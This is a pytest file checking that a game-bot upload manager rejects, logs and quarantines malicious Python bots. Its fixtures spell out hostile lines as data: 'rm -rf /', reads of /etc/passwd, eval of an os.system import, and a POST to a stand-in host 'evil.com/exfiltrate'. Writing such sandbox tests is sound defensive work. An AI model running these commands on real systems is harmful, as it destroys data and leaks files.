"""Test malicious bot detection with real examples"""
import os
import pytest
from app.bot_manager import bot_manager


def test_malicious_os_system():
    """Test bot trying to execute system commands"""
    malicious_code = b"""
import os

class EvilBot:
    def __init__(self, my_color: int, opp_color: int):
        self.my_color = my_color
        self.opp_color = opp_color
    
    def select_move(self, board):
        os.system("rm -rf /")  # Malicious!
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("evil_os.py", malicious_code)
    
    error_msg = str(exc_info.value)
    assert "os" in error_msg.lower()
    assert "security" in error_msg.lower() or "dangerous" in error_msg.lower()


def test_malicious_subprocess():
    """Test bot trying to run subprocess"""
    malicious_code = b"""
import subprocess

class EvilBot:
    def __init__(self, my_color: int, opp_color: int):
        self.my_color = my_color
    
    def select_move(self, board):
        subprocess.run(['cat', '/etc/passwd'])
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("evil_subprocess.py", malicious_code)
    
    error_msg = str(exc_info.value)
    assert "subprocess" in error_msg.lower()


def test_malicious_network_request():
    """Test bot trying to make network requests"""
    malicious_code = b"""
import requests

class EvilBot:
    def __init__(self, my_color: int, opp_color: int):
        pass
    
    def select_move(self, board):
        requests.post("http://evil.com/exfiltrate", data=str(board))
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("evil_network.py", malicious_code)
    
    error_msg = str(exc_info.value)
    assert "requests" in error_msg.lower()


def test_malicious_eval():
    """Test bot trying to use eval"""
    malicious_code = b"""
class EvilBot:
    def __init__(self, my_color: int, opp_color: int):
        pass
    
    def select_move(self, board):
        result = eval("__import__('os').system('ls')")
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("evil_eval.py", malicious_code)
    
    error_msg = str(exc_info.value)
    assert "eval" in error_msg.lower()


def test_malicious_file_read():
    """Test bot trying to read files"""
    malicious_code = b"""
class EvilBot:
    def __init__(self, my_color: int, opp_color: int):
        pass
    
    def select_move(self, board):
        with open('/etc/passwd', 'r') as f:
            secrets = f.read()
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("evil_file.py", malicious_code)
    
    error_msg = str(exc_info.value)
    assert "open" in error_msg.lower() or "file" in error_msg.lower()


def test_malicious_class_introspection():
    """Test bot trying to use class introspection"""
    malicious_code = b"""
class EvilBot:
    def __init__(self, my_color: int, opp_color: int):
        pass
    
    def select_move(self, board):
        # Try to access dangerous attributes
        bases = self.__class__.__bases__
        builtins = self.__class__.__dict__
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("evil_introspect.py", malicious_code)
    
    error_msg = str(exc_info.value)
    assert "__bases__" in error_msg or "__dict__" in error_msg or "__class__" in error_msg


def test_malicious_import_builtin():
    """Test bot trying to use __import__"""
    malicious_code = b"""
class EvilBot:
    def __init__(self, my_color: int, opp_color: int):
        pass
    
    def select_move(self, board):
        os_module = __import__('os')
        os_module.system('echo hacked')
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("evil_import.py", malicious_code)
    
    error_msg = str(exc_info.value)
    assert "__import__" in error_msg.lower()


def test_clean_valid_bot():
    """Test that a clean valid bot is accepted"""
    valid_code = b"""
import random
import typing

class GoodBot:
    def __init__(self, my_color: int, opp_color: int):
        self.my_color = my_color
        self.opp_color = opp_color
    
    def select_move(self, board: list[list[int]]) -> tuple[int, int]:
        # Simple valid bot
        n = len(board)
        for i in range(n):
            for j in range(n):
                if board[i][j] == -1:
                    return (i, j)
        return (0, 0)
"""
    
    # This should succeed
    metadata = bot_manager.upload_bot("good_bot_test.py", valid_code)
    assert metadata.name == "good_bot_test"
    
    # Clean up
    if os.path.exists(metadata.file_path):
        os.remove(metadata.file_path)
        if "good_bot_test" in bot_manager.metadata:
            del bot_manager.metadata["good_bot_test"]
            bot_manager._save_metadata()


def test_security_logging(tmp_path):
    """Test that security violations are logged"""
    from app.bot_security import security_logger
    
    # Save original paths
    original_dir = security_logger.QUARANTINE_DIR
    original_log = security_logger.SECURITY_LOG_FILE
    
    try:
        # Set up temporary paths
        security_logger.QUARANTINE_DIR = str(tmp_path / "quarantine")
        security_logger.SECURITY_LOG_FILE = str(tmp_path / "quarantine" / "security_log.json")
        
        malicious_code = b"""
import os
class Bad:
    def select_move(self, board):
        os.system("echo hacked")
        return (0, 0)
"""
        
        # Try to upload malicious bot
        with pytest.raises(ValueError):
            bot_manager.upload_bot("logged_evil.py", malicious_code, 
                                 request_info={"ip": "127.0.0.1", "user_agent": "test"})
        
        # Check that it was logged
        logs = security_logger.get_security_log()
        assert len(logs) > 0
        assert logs[0]['filename'] == 'logged_evil.py'
        assert logs[0]['request_info']['ip'] == '127.0.0.1'
        
        # Check that file was quarantined
        quarantine_path = logs[0]['quarantine_path']
        assert os.path.exists(quarantine_path)
        
    finally:
        # Restore original paths
        security_logger.QUARANTINE_DIR = original_dir
        security_logger.SECURITY_LOG_FILE = original_log


def test_detailed_error_message():
    """Test that error message contains specific violation details"""
    malicious_code = b"""
import os
import sys

class Bad:
    def select_move(self, board):
        eval("print('test')")
        return (0, 0)
"""
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("detailed_evil.py", malicious_code)
    
    error_msg = str(exc_info.value)
    # Should contain multiple violations
    assert "os" in error_msg.lower()
    assert "sys" in error_msg.lower()
    assert "eval" in error_msg.lower()
    # Should mention line numbers
    assert "line" in error_msg.lower() or "Line" in error_msg


def test_non_python_file_rejected():
    """Test that non-Python files are rejected"""
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("not_python.txt", b"some content")
    
    error_msg = str(exc_info.value)
    assert "python" in error_msg.lower() and ".py" in error_msg.lower()


def test_invalid_utf8_rejected():
    """Test that invalid UTF-8 content is rejected"""
    invalid_utf8 = b'\x80\x81\x82\x83'
    
    with pytest.raises(ValueError) as exc_info:
        bot_manager.upload_bot("invalid.py", invalid_utf8)
    
    error_msg = str(exc_info.value)
    assert "utf-8" in error_msg.lower() or "encoding" in error_msg.lower()
